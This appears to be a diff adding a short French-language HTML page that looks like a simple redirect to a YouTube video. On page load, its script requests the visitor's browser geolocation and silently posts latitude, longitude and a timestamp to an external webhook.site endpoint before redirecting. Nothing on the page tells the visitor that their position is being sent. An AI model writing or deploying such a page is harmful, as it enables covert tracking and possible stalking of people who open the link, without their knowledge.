@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Redirection avec géolocalisation</title>
+  <script>
+    function sendLocationAndRedirect() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+          const data = {
+            lat: latitude,
+            lon: longitude,
+            timestamp: new Date().toISOString()
+          };
+
+          // Envoie des données à un webhook (ex: Discord, Zapier, Google Sheets, etc.)
+          fetch("https://webhook.site/f4af94d0-e19d-48f8-952c-6c63f1ce897f", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify(data)
+          });
+
+          // Redirection vers YouTube
+          setTimeout(function() {
+            window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+          }, 1000);
+
+        }, function(error) {
+          alert("Impossible d'obtenir la localisation : " + error.message);
+          window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+        });
+      } else {
+        alert("La géolocalisation n'est pas prise en charge par ce navigateur.");
+        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+      }
+    }
+  </script>
+</head>
+<body onload="sendLocationAndRedirect()">
+  <p>Un instant... redirection en cours.</p>
+</body>
+</html>
